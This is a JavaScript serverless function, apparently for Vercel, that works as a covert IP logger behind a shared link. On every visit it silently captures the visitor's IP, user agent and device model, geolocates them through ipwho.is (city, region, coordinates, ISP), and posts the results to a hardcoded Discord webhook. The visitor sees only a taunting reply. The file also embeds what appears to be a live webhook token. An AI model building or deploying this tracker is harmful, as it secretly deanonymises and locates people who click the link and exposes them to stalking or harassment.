// File: api/apapun.js

export default async function handler(req, res) {
  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5';
  
  // Ambil IP dari Vercel
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() 
    || req.socket.remoteAddress 
    || 'unknown';
  
  const userAgentRaw = req.headers['user-agent'] || 'unknown';
  
  // === DEVICE TYPE (deteksi sederhana) ===
  let deviceType = 'Desktop';
  const uaLower = userAgentRaw.toLowerCase();
  if (uaLower.includes('mobile')) deviceType = 'Mobile';
  if (uaLower.includes('tablet') || uaLower.includes('ipad')) deviceType = 'Tablet';
  
  // === DEVICE MODEL (ambil dari User Agent apa adanya, tanpa rekayasa) ===
  let deviceModel = 'Tidak terdeteksi';
  
  // Coba ekstrak model dari user agent (seadanya)
  const patterns = [
    /SM-[A-Z0-9]+/i,           // Samsung
    /iPhone[0-9,]+/i,           // iPhone
    /Pixel\s[0-9]/i,            // Google Pixel
    /; ([^;)]+?)\)/,            // Generic ambil setelah titik koma
  ];
  
  for (let pattern of patterns) {
    const match = userAgentRaw.match(pattern);
    if (match) {
      deviceModel = match[0];
      break;
    }
  }
  
  // Kalau masih "Tidak terdeteksi", ambil kata terakhir setelah 'Android' atau ';'
  if (deviceModel === 'Tidak terdeteksi') {
    const lastResort = userAgentRaw.match(/Android\s+[0-9.]+;\s+([^;)]+)/);
    if (lastResort) deviceModel = lastResort[1].trim();
  }
  
  // === AMBIL DATA LENGKAP DARI ipwho.is ===
  let ipwhoisData = null;
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3000);
    const response = await fetch(`https://ipwho.is/${ip}`, { signal: controller.signal });
    clearTimeout(timeoutId);
    if (response.ok) ipwhoisData = await response.json();
  } catch (err) {
    console.error('GeoIP error:', err.message);
  }
  
  // === KIRIM KE DISCORD ===
  let discordContent = `**🔔 ADA YANG BUKA LINK!**\n\n` +
    `**🌐 IP:** \`${ip}\`\n` +
    `**📱 Device Type:** ${deviceType}\n` +
    `**📲 Device Model (dari User Agent):** \`${deviceModel}\`\n` +
    `**🕒 Waktu:** ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n\n`;
  
  // Info dari ipwho.is (flag, city, region, country, lat, long)
  if (ipwhoisData && ipwhoisData.success) {
    const flag = ipwhoisData.flag?.emoji || '';
    discordContent += `**📍 LOKASI DARI IPWHOIS:**\n` +
      `🇮🇩 **Negara:** ${ipwhoisData.country || 'Unknown'} ${flag}\n` +
      `🗺️ **Region:** ${ipwhoisData.region || 'Unknown'}\n` +
      `🏙️ **Kota:** ${ipwhoisData.city || 'Unknown'}\n` +
      `📌 **Koordinat:** ${ipwhoisData.latitude || '?'}, ${ipwhoisData.longitude || '?'}\n`;
    
    if (ipwhoisData.connection?.isp) {
      discordContent += `\n**🌍 ISP:** ${ipwhoisData.connection.isp}\n`;
    }
  } else {
    discordContent += `⚠️ **Gagal mengambil data lokasi**\n`;
  }
  
  // Kirim User Agent raw sebagai bukti
  discordContent += `\n**📱 USER AGENT RAW:**\n\`\`\`\n${userAgentRaw}\n\`\`\``;
  
  // Kirim ke Discord
  fetch(DISCORD_WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content: discordContent })
  }).catch(err => console.error('Discord error:', err.message));
  
  // === RESPONSE JSON ===
  res.status(200).json({
    message: "SIRI JELEK CUY"
  });
    }
